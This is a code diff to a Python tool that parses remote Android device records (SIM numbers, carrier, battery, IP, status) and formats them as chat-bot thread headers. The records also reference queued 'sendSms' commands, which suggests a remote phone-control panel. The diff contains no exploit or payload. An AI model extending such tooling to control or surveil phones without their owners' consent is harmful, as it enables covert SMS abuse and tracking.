@@ -301,6 +301,19 @@ def fb_shallow_db(base: str, path: str) -> List[str]:
 DEV_FILTER = {"f": "all", "s": "new"}
 
 
+def _first_number(*vals) -> Optional[str]:
+    """First value that looks like a phone number. Deliberately NEVER reads
+    command/sendSms/sms nodes — their number/phone/to fields are RECIPIENTS
+    of queued outgoing sends, not the device's own number."""
+    for v in vals:
+        if v is None:
+            continue
+        s = str(v).strip()
+        if s and s not in ("—", "-", "None", "null", "undefined", "?") and any(ch.isdigit() for ch in s):
+            return s
+    return None
+
+
 def parse_devices(raw: Any) -> List[Dict[str, Any]]:
     devices: List[Dict[str, Any]] = []
     if not isinstance(raw, dict):
@@ -310,10 +323,32 @@ def parse_devices(raw: Any) -> List[Dict[str, Any]]:
             continue
         sims_raw = node.get("sims")
         sims: List[Dict[str, Any]] = []
+        sim_strings: List[str] = []
         if isinstance(sims_raw, list):
-            sims = [s for s in sims_raw if isinstance(s, dict)]
+            for s in sims_raw:
+                if isinstance(s, dict):
+                    sims.append(s)
+                elif s is not None:
+                    n = _first_number(str(s))
+                    if n and n not in sim_strings:
+                        sim_strings.append(n)
         elif isinstance(sims_raw, dict):
-            sims = [s for s in sims_raw.values() if isinstance(s, dict)]
+            for s in sims_raw.values():
+                if isinstance(s, dict):
+                    sims.append(s)
+                elif s is not None:
+                    n = _first_number(str(s))
+                    if n and n not in sim_strings:
+                        sim_strings.append(n)
+        sim_numbers: List[str] = list(sim_strings)
+        for s in sims:
+            n = _first_number(s.get("phoneNumber"), s.get("number"), s.get("phone"),
+                              s.get("mobile"), s.get("msisdn"))
+            if n and n not in sim_numbers:
+                sim_numbers.append(n)
+        top_number = _first_number(node.get("mobNo"), node.get("phone"), node.get("mobile"),
+                                   node.get("number"), node.get("phoneNumber"), node.get("msisdn"),
+                                   node.get("deviceNumber"), node.get("lineNumber"))
         battery = node.get("battery")
         battery_str = str(battery) if battery is not None else "-"
         try:
@@ -333,7 +368,8 @@ def parse_devices(raw: Any) -> List[Dict[str, Any]]:
             "status": bool(node.get("status")),
             "battery": battery_str,
             "batteryPercent": battery_pct,
-            "phoneNumber": str(node.get("mobNo") or (sims[0].get("phoneNumber") if sims else None) or "-"),
+            "phoneNumber": top_number or (sim_numbers[0] if sim_numbers else None) or "-",
+            "simNumbers": sim_numbers,
             "android": str(node.get("androidV") or node.get("androidVersion") or "-"),
             "ip": str(node.get("ip_address") or "-"),
             "storage": str(node.get("storage") or "-"),
@@ -560,10 +596,29 @@ def thread_header(dev_id: str) -> str:
     info = device_info(dev_id)
     dot = "🟢" if info.get("status") else "⚫"
     sims = info.get("sims") or []
-    sims_txt = ", ".join(str(s.get("phoneNumber") or s.get("number") or s.get("phone") or "?") for s in sims[:3]) if sims else "-"
+    parts: List[str] = []
+    for i, s in enumerate(sims[:3]):
+        if not isinstance(s, dict):
+            continue
+        slot = s.get("slot", s.get("simSlot", s.get("index", s.get("id", i + 1))))
+        num = _first_number(s.get("phoneNumber"), s.get("number"), s.get("phone"),
+                            s.get("mobile"), s.get("msisdn")) or "?"
+        car = str(s.get("carrier", s.get("carrierName", s.get("operator", "")))).strip()
+        label = f"SIM{slot} {num}"
+        if car and car.lower() not in ("null", "none", "unknown", "-"):
+            label += f" ({car})"
+        parts.append(label)
+    for n in (info.get("simNumbers") or [])[:3]:
+        if n not in " ".join(parts):
+            parts.append(n)
+    sims_txt = ", ".join(parts) if parts else "-"
+    number = str(info.get("phoneNumber") or "-")
+    num_line = f"📞 <code>{html.escape(number)}</code>"
+    if number == "-":
+        num_line += " <i>(device never reported its number)</i>"
     return (
         f"<b>💬 {html.escape(str(info.get('name') or dev_id))}</b> {dot}\n"
-        f"📞 <code>{html.escape(str(info.get('phoneNumber') or '-'))}</code> · "
+        f"{num_line} · "
         f"🔋 {html.escape(str(info.get('battery') or '-'))} · "
         f"🤖 {html.escape(str(info.get('android') or '-'))}\n"
         f"SIMs: {html.escape(sims_txt)} · <code>{dev_id}</code>"
